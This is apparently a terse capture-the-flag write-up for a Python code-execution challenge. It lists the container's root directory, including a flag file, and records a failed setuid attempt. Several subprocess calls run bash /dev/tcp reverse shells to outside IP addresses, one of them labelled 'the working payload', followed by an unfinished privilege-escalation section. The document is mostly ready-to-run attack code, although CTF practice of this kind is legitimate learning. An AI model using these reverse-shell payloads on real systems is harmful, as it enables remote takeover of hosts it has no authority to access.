## remedy check
```
import os

#print all entries in current directory
print (os.listdir())
- does give us all dirs
```
## ..
```
import os

#print all entries in current directory
print (os.listdir('../'))
 ['bin', 'boot', 'dev', 'etc', 'home', 'lib', 'lib64', 'media', 'mnt', 'opt', 'proc', 'root', 'run', 'sbin', 'srv', 'sys', 'tmp', 'usr', 'var', '.dockerenv', 'flag', 'app', 'entrypoint.sh', 'uwsgi-nginx-entrypoint.sh', 'start.sh', 'install-nginx-debian.sh']
```
```
import subprocess
import os
os.setuid(0)
os.setgid(0)
result = subprocess.run(["id"], shell=True, capture_output=True, text=True)

print(result.stdout)
err: [Errno 1] Operation not permitted
```

```
import subprocess
import os
import socket,os,pty

result = subprocess.run(["bash -i &> /dev/tcp/3.6.30.85/16197 <&1"], shell=True, capture_output=True, text=True)

print(result.stdout)
```
got reverse shell
```
result = subprocess.run(["exec bash -i &> /dev/tcp/3.6.30.85/16197 <&1"], shell=True, capture_output=True, text=True)

result = subprocess.run(["bash -c 'exec bash -i &> /dev/tcp/3.6.30.85/16197 <&1'"], shell=True, capture_output=True, text=True)


result = subprocess.run(["bash -i &> /dev/tcp/3.6.30.85/16197 <&1"], shell=True, capture_output=True, text=True)

```
## the working payload
result = subprocess.run(["bash -c 'exec bash -i &> /dev/tcp/3.6.115.182/12044 <&1'"], shell=True, capture_output=True, text=True)
# escalating privilages
- ![image](https://github.com/m0wn1ka/ctf/assets/127676379/6fb246cd-cdd2-4b3e-a31d-0c6855ccbfd3)
- now all users have /nologin except nginx
- 
